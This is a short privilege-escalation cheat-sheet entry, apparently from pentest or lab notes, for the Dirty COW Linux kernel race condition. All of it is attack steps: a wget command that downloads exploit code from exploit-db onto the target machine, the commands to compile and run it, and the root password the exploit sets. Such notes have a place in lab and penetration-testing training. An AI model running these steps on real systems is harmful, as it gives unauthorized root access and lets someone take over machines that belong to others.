# Dirty COW Race Condition Privilege Escalation

On the vulnerable machine

Download the exploit code:

```bash
wget -O 40847.cpp https://www.exploit-db.com/download/40847
```


Compile:  
```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

Run: 
```
./dcow -s
```

Result:

![](/images/privesc/dirtycow.png)

Root user password: ```PoorLittleCow```
